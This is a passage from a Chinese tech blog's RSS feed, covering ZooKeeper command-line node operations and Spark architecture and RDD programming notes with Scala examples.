class="token string">"liubei"</span>Created /sanguo/shuguo<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>6）获得节点的值</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>zk: localhost:2181<span class="token punctuation">(</span>CONNECTED<span class="token punctuation">)</span> 5<span class="token punctuation">]</span> get /sanguodiaochan<span class="token punctuation">[</span>zk: localhost:2181<span class="token punctuation">(</span>CONNECTED<span class="token punctuation">)</span> 6<span class="token punctuation">]</span> get -s /sanguodiaochancZxid <span class="token operator">=</span> 0x100000003ctime <span class="token operator">=</span> Wed Aug 29 00:03:23 CST 2018mZxid <span class="token operator">=</span> 0x100000003mtime <span class="token operator">=</span> Wed Aug 29 00:03:23 CST 2018pZxid <span class="token operator">=</span> 0x100000004cversion <span class="token operator">=</span> 1dataVersion <span class="token operator">=</span> 0aclVersion <span class="token operator">=</span> 0ephemeralOwner <span class="token operator">=</span> 0x0dataLength <span class="token operator">=</span> 7numChildren <span class="token operator">=</span> 1<span class="token punctuation">[</span>zk: localhost:2181<span class="token punctuation">(</span>CONNECTED<span class="token punctuation">)</span> 7<span class="token punctuation">]</span><span class="token punctuation">[</span>zk: localhost:2181<span class="token punctuation">(</span>CONNECTED<span class="token punctuation">)</span> 7<span class="token punctuation">]</span> get -s /sanguo/shuguoliubeicZxid <span class="token operator">=</span> 0x100000004ctime <span class="token operator">=</span> Wed Aug 29 00:04:35 CST 2018mZxid <span class="token operator">=</span> 0x100000004mtime <span class="token operator">=</span> Wed Aug 29 00:04:35 CST 2018pZxid <span class="token operator">=</span> 0x100000004cversion <span class="token operator">=</span> 0dataVersion <span class="token operator">=</span> 0aclVersion <span class="token operator">=</span> 0ephemeralOwner <span class="token operator">=</span> 0x0dataLength <span class="token operator">=</span> 6numChildren <span class="token operator">=</span> 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>7）创建临时节点</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>zk: localhost:2181<span class="token punctuation">(</span>CONNECTED<span class="token punctuation">)</span> 7<span class="token punctuation">]</span> create -e /sanguo/wuguo <span class="token string">"zhouyu"</span>Created /sanguo/wuguo<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>（1）在当前客户端是能查看到的</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>zk: localhost:2181<span class="token punctuation">(</span>CONNECTED<span class="token punctuation">)</span> 3<span class="token punctuation">]</span> <span class="token function">ls</span> /sanguo <span class="token punctuation">[</span>wuguo, shuguo<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>（2）退出当前客户端然后再重启客户端</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>zk: localhost:2181<span class="token punctuation">(</span>CONNECTED<span class="token punctuation">)</span> 12<span class="token punctuation">]</span> quit<span class="token punctuation">[</span>molly@hadoop104 zookeeper-3.5.7<span class="token punctuation">]</span>$ bin/zkCli.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>（3）再次查看根目录下短暂节点已经删除</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>zk: localhost:2181<span class="token punctuation">(</span>CONNECTED<span class="token punctuation">)</span> 0<span class="token punctuation">]</span> <span class="token function">ls</span> /sanguo<span class="token punctuation">[</span>shuguo<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>8）创建带序号的节点</p><p>​    （1）先创建一个普通的根节点/sanguo/weiguo</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>zk: localhost:2181<span class="token punctuation">(</span>CONNECTED<span class="token punctuation">)</span> 1<span class="token punctuation">]</span> create /sanguo/weiguo <span class="token string">"caocao"</span>Created /sanguo/weiguo<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>​    （2）创建带序号的节点</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>zk: localhost:2181<span class="token punctuation">(</span>CONNECTED<span class="token punctuation">)</span> 2<span class="token punctuation">]</span> create /sanguo/weiguo <span class="token string">"caocao"</span>Node already exists: /sanguo/weiguo<span class="token punctuation">[</span>zk: localhost:2181<span class="token punctuation">(</span>CONNECTED<span class="token punctuation">)</span> 3<span class="token punctuation">]</span> create -s /sanguo/weiguo <span class="token string">"caocao"</span>Created /sanguo/weiguo0000000000<span class="token punctuation">[</span>zk: localhost:2181<span class="token punctuation">(</span>CONNECTED<span class="token punctuation">)</span> 4<span class="token punctuation">]</span> create -s /sanguo/weiguo <span class="token string">"caocao"</span>Created /sanguo/weiguo0000000001<span class="token punctuation">[</span>zk: localhost:2181<span class="token punctuation">(</span>CONNECTED<span class="token punctuation">)</span> 5<span class="token punctuation">]</span> create -s /sanguo/weiguo <span class="token string">"caocao"</span>Created /sanguo/weiguo0000000002<span class="token punctuation">[</span>zk: localhost:2181<span class="token punctuation">(</span>CONNECTED<span class="token punctuation">)</span> 6<span class="token punctuation">]</span> <span class="token function">ls</span> /sanguo<span class="token punctuation">[</span>shuguo, weiguo, weiguo0000000000, weiguo0000000001, weiguo0000000002, wuguo<span class="token punctuation">]</span><span class="token punctuation">[</span>zk: localhost:2181<span class="token punctuation">(</span>CONNECTED<span class="token punctuation">)</span> 6<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果节点下原来没有子节点，序号从0开始依次递增。如果原节点下已有2个节点，则再排序时从2开始，以此类推。</p><p>9）修改节点数据值</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>zk: localhost:2181<span class="token punctuation">(</span>CONNECTED<span class="token punctuation">)</span> 6<span class="token punctuation">]</span> <span class="token keyword">set</span> /sanguo/weiguo <span class="token string">"caopi"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>10）节点的值变化监听</p><p>​    （1）在hadoop104主机上注册监听/sanguo节点数据变化</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>zk: localhost:2181<span class="token punctuation">(</span>CONNECTED<span class="token punctuation">)</span> 26<span class="token punctuation">]</span> <span class="token punctuation">[</span>zk: localhost:2181<span class="token punctuation">(</span>CONNECTED<span class="token punctuation">)</span> 8<span class="token punctuation">]</span> get -w /sanguo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​    （2）在hadoop103主机上修改/sanguo节点的数据</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>zk: localhost:2181<span class="token punctuation">(</span>CONNECTED<span class="token punctuation">)</span> 1<span class="token punctuation">]</span> <span class="token keyword">set</span> /sanguo <span class="token string">"xishi"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​    （3）观察hadoop104主机收到数据变化的监听</p><pre class="line-numbers language-bash"><code class="language-bash">WATCHER::WatchedEvent state:SyncConnected type:NodeDataChanged path:/sanguo<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>11）节点的子节点变化监听（路径变化）</p><p>​    （1）在hadoop104主机上注册监听/sanguo节点的子节点变化</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>zk: localhost:2181<span class="token punctuation">(</span>CONNECTED<span class="token punctuation">)</span> 1<span class="token punctuation">]</span> <span class="token function">ls</span> -w /sanguo<span class="token punctuation">[</span>aa0000000001, server101<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>​    （2）在hadoop103主机/sanguo节点上创建子节点</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>zk: localhost:2181<span class="token punctuation">(</span>CONNECTED<span class="token punctuation">)</span> 2<span class="token punctuation">]</span> create /sanguo/jin <span class="token string">"simayi"</span>Created /sanguo/jin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>​    （3）观察hadoop104主机收到子节点变化的监听</p><pre class="line-numbers language-bash"><code class="language-bash">WATCHER::WatchedEvent state:SyncConnected type:NodeChildrenChanged path:/sanguo<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>12）删除节点</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>zk: localhost:2181<span class="token punctuation">(</span>CONNECTED<span class="token punctuation">)</span> 4<span class="token punctuation">]</span> delete /sanguo/jin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>13）递归删除节点</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>zk: localhost:2181<span class="token punctuation">(</span>CONNECTED<span class="token punctuation">)</span> 15<span class="token punctuation">]</span> deleteall /sanguo/shuguo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>14）查看节点状态</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>zk: localhost:2181<span class="token punctuation">(</span>CONNECTED<span class="token punctuation">)</span> 17<span class="token punctuation">]</span> <span class="token function">stat</span> /sanguocZxid <span class="token operator">=</span> 0x100000003ctime <span class="token operator">=</span> Wed Aug 29 00:03:23 CST 2018mZxid <span class="token operator">=</span> 0x100000011mtime <span class="token operator">=</span> Wed Aug 29 00:21:23 CST 2018pZxid <span class="token operator">=</span> 0x100000014cversion <span class="token operator">=</span> 9dataVersion <span class="token operator">=</span> 1aclVersion <span class="token operator">=</span> 0ephemeralOwner <span class="token operator">=</span> 0x0dataLength <span class="token operator">=</span> 4numChildren <span class="token operator">=</span> 1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content:encoded>
      
      
      <category domain="https://m01ly.github.io/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%BC%80%E5%8F%91/">大数据开发</category>
      
      
      <category domain="https://m01ly.github.io/tags/Zookeeper/">Zookeeper</category>
      
      
      <comments>https://m01ly.github.io/2020/12/01/bigdata-zookeeper1-setup/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Spark学习笔记（二） 架构解析和RDD编程</title>
      <link>https://m01ly.github.io/2020/11/29/bigdata-Spark2-framework/</link>
      <guid>https://m01ly.github.io/2020/11/29/bigdata-Spark2-framework/</guid>
      <pubDate>Sun, 29 Nov 2020 09:29:54 GMT</pubDate>
      
        
        
      <description></description>
        
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="1-Spark运行架构"><a href="#1-Spark运行架构" class="headerlink" title="1 Spark运行架构"></a>1 Spark运行架构</h1><h2 id="1-1-运行架构"><a href="#1-1-运行架构" class="headerlink" title="1.1 运行架构"></a>1.1 运行架构</h2><p>Spark框架的核心是一个计算引擎，整体来说，它采用了标准 master-slave 的结构。</p><p>如下图所示，它展示了一个 Spark执行时的基本结构。图形中的Driver表示master，负责管理整个集群中的作业任务调度。图形中的Executor 则是 slave，负责实际执行任务。</p><p><img src="/2020/11/29/bigdata-Spark2-framework/1638183145356.png" alt="1638183145356"></p><h2 id="1-2-核心组件"><a href="#1-2-核心组件" class="headerlink" title="1.2 核心组件"></a>1.2 核心组件</h2><p>由上图可以看出，对于Spark框架有两个核心组件：</p><h3 id="1-2-1-Driver"><a href="#1-2-1-Driver" class="headerlink" title="1.2.1 Driver"></a>1.2.1 Driver</h3><p>Spark驱动器节点，用于执行Spark任务中的main方法，负责实际代码的执行工作。Driver在Spark作业执行时主要负责：</p><p>Ø 将用户程序转化为作业（job）</p><p>Ø 在Executor之间调度任务(task)</p><p>Ø 跟踪Executor的执行情况</p><p>Ø 通过UI展示查询运行情况</p><p>实际上，我们无法准确地描述Driver的定义，因为在整个的编程过程中没有看到任何有关Driver的字眼。所以简单理解，所谓的Driver就是驱使整个应用运行起来的程序，也称之为Driver类。</p><h3 id="1-2-2-Executor"><a href="#1-2-2-Executor" class="headerlink" title="1.2.2 Executor"></a>1.2.2 Executor</h3><p>Spark Executor是集群中工作节点（Worker）中的一个JVM进程，负责在 Spark 作业中运行具体任务（Task），任务彼此之间相互独立。Spark 应用启动时，Executor节点被同时启动，并且始终伴随着整个 Spark 应用的生命周期而存在。如果有Executor节点发生了故障或崩溃，Spark 应用也可以继续执行，会将出错节点上的任务调度到其他Executor节点上继续运行。</p><p>Executor有两个核心功能：</p><p>Ø 负责运行组成Spark应用的任务，并将结果返回给驱动器进程</p><p>Ø 它们通过自身的块管理器（Block Manager）为用户程序中要求缓存的 RDD 提供内存式存储。RDD 是直接缓存在Executor进程内的，因此任务可以在运行时充分利用缓存数据加速运算。</p><h3 id="1-2-3-Master-amp-Worker"><a href="#1-2-3-Master-amp-Worker" class="headerlink" title="1.2.3 Master &amp; Worker"></a>1.2.3 Master &amp; Worker</h3><p>Spark集群的独立部署环境中，不需要依赖其他的资源调度框架，自身就实现了资源调度的功能，所以环境中还有其他两个核心组件：Master和Worker，这里的Master是一个进程，主要负责资源的调度和分配，并进行集群的监控等职责，类似于Yarn环境中的RM, 而Worker呢，也是进程，一个Worker运行在集群中的一台服务器上，由Master分配资源对数据进行并行的处理和计算，类似于Yarn环境中NM。</p><h3 id="1-2-4-ApplicationMaster"><a href="#1-2-4-ApplicationMaster" class="headerlink" title="1.2.4 ApplicationMaster"></a>1.2.4 ApplicationMaster</h3><p>Hadoop用户向YARN集群提交应用程序时,提交程序中应该包含ApplicationMaster，用于向资源调度器申请执行任务的资源容器Container，运行用户自己的程序任务job，监控整个任务的执行，跟踪整个任务的状态，处理任务失败等异常情况。</p><p>说的简单点就是，ResourceManager（资源）和Driver（计算）之间的解耦合靠的就是ApplicationMaster。</p><h2 id="1-3-核心概念"><a href="#1-3-核心概念" class="headerlink" title="1.3 核心概念"></a>1.3 核心概念</h2><h3 id="1-3-1-Executor与Core（核）"><a href="#1-3-1-Executor与Core（核）" class="headerlink" title="1.3.1 Executor与Core（核）"></a>1.3.1 Executor与Core（核）</h3><p>Spark Executor是集群中运行在工作节点（Worker）中的一个JVM进程，是整个集群中的专门用于计算的节点。在提交应用中，可以提供参数指定计算节点的个数，以及对应的资源。这里的资源一般指的是工作节点Executor的内存大小和使用的虚拟CPU核（Core）数量。</p><p>应用程序相关启动参数如下：</p><table><thead><tr><th>名称</th><th>说明</th></tr></thead><tbody><tr><td>–num-executors</td><td>配置Executor的数量</td></tr><tr><td>–executor-memory</td><td>配置每个Executor的内存大小</td></tr><tr><td>–executor-cores</td><td>配置每个Executor的虚拟CPU  core数量</td></tr></tbody></table><h3 id="1-3-2-并行度（Parallelism）"><a href="#1-3-2-并行度（Parallelism）" class="headerlink" title="1.3.2 并行度（Parallelism）"></a>1.3.2 并行度（Parallelism）</h3><p>在分布式计算框架中一般都是多个任务同时执行，由于任务分布在不同的计算节点进行计算，所以能够真正地实现多任务并行执行，记住，这里是并行，而不是并发。这里我们将整个集群并行执行任务的数量称之为并行度。那么一个作业到底并行度是多少呢？这个取决于框架的默认配置。应用程序也可以在运行过程中动态修改。</p><h3 id="1-3-3-有向无环图（DAG）"><a href="#1-3-3-有向无环图（DAG）" class="headerlink" title="1.3.3 有向无环图（DAG）"></a>1.3.3 有向无环图（DAG）</h3><p><img src="/2020/11/29/bigdata-Spark2-framework/1638183179425.png" alt="1638183179425"></p><p>大数据计算引擎框架我们根据使用方式的不同一般会分为四类，其中第一类就是Hadoop所承载的MapReduce,它将计算分为两个阶段，分别为 Map阶段 和 Reduce阶段。对于上层应用来说，就不得不想方设法去拆分算法，甚至于不得不在上层应用实现多个 Job 的串联，以完成一个完整的算法，例如迭代计算。 由于这样的弊端，催生了支持 DAG 框架的产生。因此，支持 DAG 的框架被划分为第二代计算引擎。如 Tez 以及更上层的 Oozie。这里我们不去细究各种 DAG 实现之间的区别，不过对于当时的 Tez 和 Oozie 来说，大多还是批处理的任务。接下来就是以 Spark 为代表的第三代的计算引擎。第三代计算引擎的特点主要是 Job 内部的 DAG 支持（不跨越 Job），以及实时计算。</p><p>这里所谓的有向无环图，并不是真正意义的图形，而是由Spark程序直接映射成的数据流的高级抽象模型。简单理解就是将整个程序计算的执行过程用图形表示出来,这样更直观，更便于理解，可以用于表示程序的拓扑结构。</p><p>DAG（Directed Acyclic Graph）有向无环图是由点和线组成的拓扑图形，该图形具有方向，不会闭环。</p><h2 id="1-4-提交流程"><a href="#1-4-提交流程" class="headerlink" title="1.4 提交流程"></a>1.4 提交流程</h2><p>所谓的提交流程，其实就是我们开发人员根据需求写的应用程序通过Spark客户端提交给Spark运行环境执行计算的流程。在不同的部署环境中，这个提交过程基本相同，但是又有细微的区别，我们这里不进行详细的比较，但是因为国内工作中，将Spark引用部署到Yarn环境中会更多一些，所以本课程中的提交流程是基于Yarn环境的。</p><p><img src="/2020/11/29/bigdata-Spark2-framework/1638183211849.png" alt="1638183211849"></p><p>Spark应用程序提交到Yarn环境中执行的时候，一般会有两种部署执行的方式：Client和Cluster。两种模式主要区别在于：Driver程序的运行节点位置。</p><h3 id="1-2-1-Yarn-Client模式"><a href="#1-2-1-Yarn-Client模式" class="headerlink" title="1.2.1 Yarn Client模式"></a>1.2.1 Yarn Client模式</h3><p>Client模式将用于监控和调度的Driver模块在客户端执行，而不是在Yarn中，所以一般用于测试。</p><p>Ø Driver在任务提交的本地机器上运行</p><p>Ø Driver启动后会和ResourceManager通讯申请启动ApplicationMaster</p><p>Ø ResourceManager分配container，在合适的NodeManager上启动ApplicationMaster，负责向ResourceManager申请Executor内存</p><p>Ø ResourceManager接到ApplicationMaster的资源申请后会分配container，然后ApplicationMaster在资源分配指定的NodeManager上启动Executor进程</p><p>Ø Executor进程启动后会向Driver反向注册，Executor全部注册完成后Driver开始执行main函数</p><p>Ø 之后执行到Action算子时，触发一个Job，并根据宽依赖开始划分stage，每个stage生成对应的TaskSet，之后将task分发到各个Executor上执行。</p><h3 id="1-2-2-Yarn-Cluster模式"><a href="#1-2-2-Yarn-Cluster模式" class="headerlink" title="1.2.2 Yarn Cluster模式"></a>1.2.2 Yarn Cluster模式</h3><p>Cluster模式将用于监控和调度的Driver模块启动在Yarn集群资源中执行。一般应用于实际生产环境。</p><p>Ø 在YARN Cluster模式下，任务提交后会和ResourceManager通讯申请启动ApplicationMaster，</p><p>Ø 随后ResourceManager分配container，在合适的NodeManager上启动ApplicationMaster，此时的ApplicationMaster就是Driver。</p><p>Ø Driver启动后向ResourceManager申请Executor内存，ResourceManager接到ApplicationMaster的资源申请后会分配container，然后在合适的NodeManager上启动Executor进程</p><p>Ø Executor进程启动后会向Driver反向注册，Executor全部注册完成后Driver开始执行main函数，</p><p>Ø 之后执行到Action算子时，触发一个Job，并根据宽依赖开始划分stage，每个stage生成对应的TaskSet，之后将task分发到各个Executor上执行。</p><h1 id="2-Spark核心编程"><a href="#2-Spark核心编程" class="headerlink" title="2  Spark核心编程"></a>2  Spark核心编程</h1><p>Spark计算框架为了能够进行高并发和高吞吐的数据处理，封装了三大数据结构，用于处理不同的应用场景。三大数据结构分别是：</p><p>Ø RDD : 弹性分布式数据集</p><p>Ø 累加器：分布式共享只写变量</p><p>Ø 广播变量：分布式共享只读变量</p><p>接下来我们一起看看这三大数据结构是如何在数据处理中使用的。</p><h2 id="2-1-RDD"><a href="#2-1-RDD" class="headerlink" title="2.1 RDD"></a>2.1 RDD</h2><h3 id="2-1-1-什么是RDD"><a href="#2-1-1-什么是RDD" class="headerlink" title="2.1.1 什么是RDD"></a>2.1.1 什么是RDD</h3><p>RDD（Resilient Distributed Dataset）叫做弹性分布式数据集，是Spark中最基本的数据处理模型。代码中是一个抽象类，它代表一个弹性的、不可变、可分区、里面的元素可并行计算的集合。<strong>（所谓的RDD，其实就是要给数据结构，类似于链表中的Node，RDD中有适合并行计算的分区操作；RDD中封装了最小的计算单元，目的是更适合重复使用；Spark主要就是通过组合RDD的操作完成业务需求。）</strong></p><p>那Spark  怎么组合RDD？</p><p><strong>RDD的扩展功能采用的也是装饰者设计模式；RDD中的collect方法类似于IO中的read方法。RDD不存储任何数据，只封装逻辑。</strong></p><p><img src="/2020/11/29/bigdata-Spark2-framework/1638181914698.png" alt="1638181914698"></p><p>Ø 弹性</p><p>l 存储的弹性：内存与磁盘的自动切换；</p><p>l 容错的弹性：数据丢失可以自动恢复；</p><p>l 计算的弹性：计算出错重试机制；</p><p>l 分片的弹性：可根据需要重新分片。</p><p>Ø 分布式：数据存储在大数据集群不同节点上</p><p>Ø 数据集：<strong>RDD封装了计算逻辑，并不保存数据</strong></p><p>Ø 数据抽象：RDD是一个抽象类，需要子类具体实现</p><p>Ø 不可变：RDD封装了计算逻辑，是不可以改变的，想要改变，只能产生新的RDD，在新的RDD里面封装计算逻辑</p><p>Ø 可分区、并行计算</p><h3 id="2-1-2-核心属性"><a href="#2-1-2-核心属性" class="headerlink" title="2.1.2 核心属性"></a>2.1.2 核心属性</h3><p><img src="/2020/11/29/bigdata-Spark2-framework/clip_image086.jpg" alt="img"></p><p><img src="/2020/11/29/bigdata-Spark2-framework/1638182223714.png" alt="1638182223714"></p><p>1）分区列表</p><p>RDD数据结构中存在分区列表，用于执行任务时并行计算，是实现分布式计算的重要属性。</p><p>2） 分区计算函数</p><p>Spark在计算时，是使用分区函数对每一个分区进行计算</p><p>3）RDD之间的依赖关系</p><p>RDD是计算模型的封装，当需求中需要将多个计算模型进行组合时，就需要将多个RDD建立依赖关系</p><p>4） 分区器（可选）</p><p>当数据为KV类型数据时，可以通过设定分区器自定义数据的分区</p><p>5）首选位置（可选）</p><p>计算数据时，可以根据计算节点的状态选择不同的节点位置进行计算</p><h3 id="2-1-3-执行原理"><a href="#2-1-3-执行原理" class="headerlink" title="2.1.3 执行原理"></a>2.1.3 执行原理</h3><p>从计算的角度来讲，数据处理过程中需要<strong>计算资源（内存 &amp; CPU）</strong>和<strong>计算模型（逻辑）</strong>。执行时，需<strong>要将计算资源和计算模型进行协调和整合</strong>。</p><p>Spark框架在执行时，先申请资源，然后将应用程序的数据处理逻辑<strong>分解成一个一个的计算任务</strong>。然后将任务发到已经分配资源的计算节点上, 按照指定的计算模型进行数据计算。最后得到计算结果。</p><p>RDD是Spark框架中用于数据处理的核心模型，接下来我们看看，在Yarn环境中，RDD的工作原理:</p><ol><li>启动Yarn集群环境</li></ol><p><img src="/2020/11/29/bigdata-Spark2-framework/1638182323787.png" alt="1638182323787"></p><ol start="2"><li>Spark通过申请资源创建调度节点和计算节点</li></ol><p><img src="/2020/11/29/bigdata-Spark2-framework/1638182335328.png" alt="1638182335328"></p><ol start="3"><li>Spark框架根据需求将计算逻辑根据分区划分成不同的任务</li></ol><p><img src="/2020/11/29/bigdata-Spark2-framework/1638182347091.png" alt="1638182347091"></p><ol start="4"><li>调度节点将任务根据计算节点状态发送到对应的计算节点进行计算</li></ol><p><img src="/2020/11/29/bigdata-Spark2-framework/1638182359929.png" alt="1638182359929"></p><p>从以上流程可以看出RDD在整个流程中主要用于将逻辑进行封装，并生成Task发送给Executor节点执行计算，接下来我们就一起看看Spark框架中RDD是具体是如何进行数据处理的。</p><h3 id="2-1-4-基础编程"><a href="#2-1-4-基础编程" class="headerlink" title="2.1.4 基础编程"></a>2.1.4 基础编程</h3><h4 id="2-1-4-1-RDD创建"><a href="#2-1-4-1-RDD创建" class="headerlink" title="2.1.4.1 RDD创建"></a>2.1.4.1 RDD创建</h4><p>在Spark中创建RDD的创建方式可以分为<strong>四种</strong>：</p><p><strong>1)    从集合（内存）中创建RDD</strong></p><p>从集合中创建RDD，<a href="https://www.iteblog.com/archives/tag/spark/">Spark</a>主要提供了两个方法：parallelize和<strong>makeRDD(推荐使用)</strong></p><pre class="line-numbers language-scala"><code class="language-scala"><span class="token keyword">val</span> sparkConf <span class="token operator">=</span>    <span class="token keyword">new</span> SparkConf<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>setMaster<span class="token punctuation">(</span><span class="token string">"local[*]"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>setAppName<span class="token punctuation">(</span><span class="token string">"spark"</span><span class="token punctuation">)</span><span class="token keyword">val</span> sparkContext <span class="token operator">=</span> <span class="token keyword">new</span> SparkContext<span class="token punctuation">(</span>sparkConf<span class="token punctuation">)</span><span class="token keyword">val</span> rdd1 <span class="token operator">=</span> sparkContext<span class="token punctuation">.</span>parallelize<span class="token punctuation">(</span>    List<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">val</span> rdd2 <span class="token operator">=</span> sparkContext<span class="token punctuation">.</span>makeRDD<span class="token punctuation">(</span>    List<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>rdd1<span class="token punctuation">.</span>collect<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>foreach<span class="token punctuation">(</span>println<span class="token punctuation">)</span>rdd2<span class="token punctuation">.</span>collect<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>foreach<span class="token punctuation">(</span>println<span class="token punctuation">)</span>sparkContext<span class="token punctuation">.</span>stop<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="2"><li>从外部存储（文件）创建RDD</li></ol><p>由外部存储系统的数据集创建RDD(<strong>textFile函数</strong>)包括：本地的文件系统，所有Hadoop支持的数据集，比如HDFS、HBase等。。</p><pre class="line-numbers language-scala"><code class="language-scala"><span class="token keyword">val</span> sparkConf <span class="token operator">=</span>    <span class="token keyword">new</span> SparkConf<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>setMaster<span class="token punctuation">(</span><span class="token string">"local[*]"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>setAppName<span class="token punctuation">(</span><span class="token string">"spark"</span><span class="token punctuation">)</span><span class="token keyword">val</span> sparkContext <span class="token operator">=</span> <span class="token keyword">new</span> SparkContext<span class="token punctuation">(</span>sparkConf<span class="token punctuation">)</span><span class="token keyword">val</span> fileRDD<span class="token operator">:</span> RDD<span class="token punctuation">[</span><span class="token builtin">String</span><span class="token punctuation">]</span> <span class="token operator">=</span> sparkContext<span class="token punctuation">.</span>textFile<span class="token punctuation">(</span><span class="token string">"data/input.txt"</span><span class="token punctuation">)</span>fileRDD<span class="token punctuation">.</span>collect<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>foreach<span class="token punctuation">(</span>println<span class="token punctuation">)</span>sparkContext<span class="token punctuation">.</span>stop<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>3)    从其他RDD创建</strong></p><p>主要是通过一个RDD运算完后，再产生新的RDD。详情请参考后续章节</p><p><strong>4)    直接创建RDD（new）</strong></p><p>使用new的方式直接构造RDD，一般由Spark框架自身使用。</p><h4 id="2-1-4-2-RDD并行度与分区"><a href="#2-1-4-2-RDD并行度与分区" class="headerlink" title="2.1.4.2 RDD并行度与分区"></a>2.1.4.2 RDD并行度与分区</h4><p>默认情况下，Spark可以将一个作业切分多个任务后，发送给Executor节点并行计算，而能够并行计算的任务数量我们称之为并行度。这个数量可以在构建RDD时指定。<strong>记住，这里的并行执行的任务数量，并不是指的切分任务的数量，不要混淆了。</strong></p><pre class="line-numbers language-scala"><code class="language-scala"><span class="token keyword">val</span> sparkConf <span class="token operator">=</span>    <span class="token keyword">new</span> SparkConf<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>setMaster<span class="token punctuation">(</span><span class="token string">"local[*]"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>setAppName<span class="token punctuation">(</span><span class="token string">"spark"</span><span class="token punctuation">)</span><span class="token keyword">val</span> sparkContext <span class="token operator">=</span> <span class="token keyword">new</span> SparkContext<span class="token punctuation">(</span>sparkConf<span class="token punctuation">)</span><span class="token keyword">val</span> dataRDD<span class="token operator">:</span> RDD<span class="token punctuation">[</span><span class="token builtin">Int</span><span class="token punctuation">]</span> <span class="token operator">=</span>    sparkContext<span class="token punctuation">.</span>makeRDD<span class="token punctuation">(</span>        List<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token number">4</span><span class="token punctuation">)</span><span class="token keyword">val</span> fileRDD<span class="token operator">:</span> RDD<span class="token punctuation">[</span><span class="token builtin">String</span><span class="token punctuation">]</span> <span class="token operator">=</span>    sparkContext<span class="token punctuation">.</span>textFile<span class="token punctuation">(</span>        <span class="token string">"input"</span><span class="token punctuation">,</span>        <span class="token number">2</span><span class="token punctuation">)</span>fileRDD<span class="token punctuation">.</span>collect<span class="token 